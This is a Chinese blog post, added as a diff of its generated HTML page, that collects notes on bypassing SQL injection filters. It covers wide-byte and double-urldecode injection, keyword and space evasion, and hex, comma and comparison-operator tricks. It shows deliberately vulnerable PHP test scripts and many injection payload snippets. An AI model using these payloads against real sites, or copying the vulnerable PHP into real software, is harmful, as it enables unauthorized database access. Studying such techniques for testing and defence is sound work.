@@ -1,0 +1,512 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="麻薯">
+  <meta name="keywords" content="">
+  
+  <title>sql注入中的一些绕过方法 - Leticia&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Leticia's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sql注入中的一些绕过方法">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-04-01 11:47" pubdate>
+        2018年4月1日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sql注入中的一些绕过方法</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x00-sql注入"><a href="#0x00-sql注入" class="headerlink" title="0x00 sql注入"></a>0x00 sql注入</h2><p>之前搭建sql注入环境测试过最基本的sql注入，但是实际情况中，会有很多的过滤来限制注入，这里记录读了《代码审计》和网络上搜集学习之后后掌握的几种常见的绕过方法，当作笔记。</p>
+<h2 id="0x01-大小写绕过"><a href="#0x01-大小写绕过" class="headerlink" title="0x01 大小写绕过"></a>0x01 大小写绕过</h2><p>mysql语句是不区分大小写的，如果过滤时没考虑到这点，就可以通过大小写混用来绕过。<br>如：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">UNion</span> <span class="hljs-built_in">SeLecT</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x02-宽字节注入"><a href="#0x02-宽字节注入" class="headerlink" title="0x02 宽字节注入"></a>0x02 宽字节注入</h2><p>程序在进行操作之前一般会进行一些编码处理，但是做编码处理的函数是有问题的，比如在使用php连接mysql时，如果设置“set character_set_client=gbk” 时，就会导致宽字节注入问题。<br>如提交1’ and 1=1’时，对引号的过滤会把提交的语句变为1&#39; and 1=1#’,这个时候，我们就没有把前面的引号闭合，无法使语句判别为真。<br>这个时候，我们如果提交1%df’ and ‘ 1=1’，由于反斜杠是%5c，%df%5c在编码处理时组成了“運”，然后我们的语句就变成了1運’ and 1=1#’成功闭合了前面的引号。  </p>
+<p>我们实战测试一下，在test.php中写入如下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=gb2312&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect error: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-variable">$uid</span> = addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM user where id=<span class="hljs-subst">$uid</span>&quot;</span>;<br>mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;set names gbk&quot;</span>);<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br>print_r(<span class="hljs-string">&#x27;当前语句: &#x27;</span> .<span class="hljs-variable">$sql</span>. <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>然后传入参数进行测试</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg01.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg02.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x03-正则替换绕过"><a href="#0x03-正则替换绕过" class="headerlink" title="0x03 正则替换绕过"></a>0x03 正则替换绕过</h2><p>有的防注入机制会正则匹配危险关键字并用空白替换，这个时候可以写出类似：  </p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">UNunionION</span> SEL<span class="hljs-literal">select</span>ECT<br></code></pre></td></tr></table></figure>
+<p>之类的用法，这个时候正则匹配一遍将union删除，剩下的部分又变成了UNION，就成功的绕过了。</p>
+<h2 id="0x04-二次urldecode注入"><a href="#0x04-二次urldecode注入" class="headerlink" title="0x04 二次urldecode注入"></a>0x04 二次urldecode注入</h2><p>web程序进行参数过滤时，很多采用反斜杠来转义单引号等危险参数的方法。如果某处使用了urldecode或者rawurldecode函数，会导致二次解码生成单引号。<br>如我们提交的是/test.php?id=1%2527，因为没有提交单引号没有触发过滤，%25的解码结果是%。则第一次解码之后是/test.php?id=1%27，如果程序里面再次使用urldecode解码id参数的话，就会生成/test.php?id=1’，单引号成功闭合。  </p>
+<p>我们们实战测试一下，在test.php中写入如下代码:  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br><span class="hljs-variable">$b</span>=urldecode(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$a=&#x27;</span>.<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$b=&#x27;</span>.<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后传入参数进行测试，结果如下:</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg03.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg04.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x05-十六进制绕过"><a href="#0x05-十六进制绕过" class="headerlink" title="0x05 十六进制绕过"></a>0x05 十六进制绕过</h2><p>对于某些进行敏感词汇检查的机制，可以通过填ascii编码的十六进制来绕过，如：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,table_name,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> from information_schema.tables where table_schema=<span class="hljs-number">0</span>x<span class="hljs-number">76657374</span><br></code></pre></td></tr></table></figure>
+<p>其中0x76657374是test的十六进制表示</p>
+<h2 id="0x06-空格绕过"><a href="#0x06-空格绕过" class="headerlink" title="0x06 空格绕过"></a>0x06 空格绕过</h2><p>在SQL注入时，空格的使用是非常普遍的，如果目标对空格进行了限制，这个时候有这几种绕过方法：<br>如我们原来要查询用户  </p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>  <br></code></pre></td></tr></table></figure>
+<p>用注释替换空格：  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">select<span class="hljs-regexp">/**/u</span>sername<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/u</span>ser<br></code></pre></td></tr></table></figure>
+<p>用回车（%0a）来替换空格</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>ausername<span class="hljs-variable">%0</span>afrom<span class="hljs-variable">%0</span>auser<br></code></pre></td></tr></table></figure>
+<p>如果括号没有被过滤，那么能计算的一些式子也可以用括号来绕过<br>如</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select username() <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where <span class="hljs-attribute">1</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">2</span>=2<br></code></pre></td></tr></table></figure>
+<p>可以写成</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">select</span>(<span class="hljs-title">username</span>())<span class="hljs-variable">from</span> <span class="hljs-variable">user</span> <span class="hljs-title">where</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>)<span class="hljs-title">and</span>(<span class="hljs-number">2</span>=<span class="hljs-number">2</span>)</span><br></code></pre></td></tr></table></figure>
+<p>虽然这句里面还有空格无法实现替换，但是在某些情况是一个非常实用的技巧。</p>
+<h2 id="0x07-注释符绕过"><a href="#0x07-注释符绕过" class="headerlink" title="0x07 注释符绕过"></a>0x07 注释符绕过</h2><p>sql注入中可以用到的注释符是#或者–，如果目标没有过滤，在需要注释掉后面的引号等情况下十分好用。<br>如：</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> union select * from <span class="hljs-keyword">user</span> <span class="hljs-title">--</span><br><span class="hljs-title">1</span>&#x27; <span class="hljs-keyword">and</span> &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="0x08-逗号绕过"><a href="#0x08-逗号绕过" class="headerlink" title="0x08 逗号绕过"></a>0x08 逗号绕过</h2><p>在某些WAF中对逗号进行了限制，或者一些通过逗号分隔post请求的环境，我们需要绕过逗号。<br>如我们要判断user第一个字符的ascii是否小于150，小于则返回1，否则返回0，我们知道从文本中提取字符应该用mid()函数，用法如下：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> MID(<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">start</span>[,length]) <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span>;<br></code></pre></td></tr></table></figure>
+<p>如果要实现上面所说功能本该这么构造：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> ascii(mid(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">150</span><br></code></pre></td></tr></table></figure>
+<p>但是如果没了逗号，我们就得用from x for y的形式：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> mid(user() from <span class="hljs-number">1</span> for <span class="hljs-number">1</span>)&lt;<span class="hljs-number">150</span><br></code></pre></td></tr></table></figure>
+<p>再如有的时候，我们需要用limit函数来限制返回的数据数量，如我们要查询，从第三行开始的一行数据，limit之后的第一个数字代表行数（从0开始算）后面数字代表从这行要返回的行数<br>数据表如下：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg05.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg06.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果逗号无法使用，我们可以用offset，offset和limit同时用用法如下：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> column1, column2, columnN <br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">LIMIT</span> [<span class="hljs-keyword">no</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">rows</span>] <span class="hljs-keyword">OFFSET</span> [<span class="hljs-keyword">row</span> num]<br></code></pre></td></tr></table></figure>
+<p>所以这里我们可以：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg07.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x09-比较符号绕过"><a href="#0x09-比较符号绕过" class="headerlink" title="0x09 比较符号绕过"></a>0x09 比较符号绕过</h2><p>在盲注的时候，很多时候要用到比较符号大于(&lt;)和小于(&gt;)来进行二分查找，如果目标对比较符号进行了过滤，我们就需要通过greatest和least等函数进行绕过，这两个函数用法如下：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">GREATEST</span>(<span class="hljs-params">value1, value2, ...</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">LEAST</span>(<span class="hljs-params">value1,value2,...</span>)</span>;<br></code></pre></td></tr></table></figure>
+<p>greatest函数会返回这些值里的最大值，least函数会返回最小值。如果我们要用刚才的mid方法比较，就需要这样构造：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">greatest(<span class="hljs-name">ascii</span>(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">150</span>)<br>least(<span class="hljs-name">ascii</span>(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">150</span>)<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>sql注入中常年作为owasp top 10中排名第一的漏洞，其危害不可小觑，有危害就有限制，有限制就有绕过，在这里比拼的是安全人员对漏洞原理的理解。如果作为防御方，更要有扎实的基本功，才能尽力避免这些问题。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/tags/mysql/">mysql</a>
+                    
+                      <a class="hover-with-bg" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/04/04/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">跨站脚本攻击XSS</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/03/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+                        <span class="hidden-mobile">文件上传漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
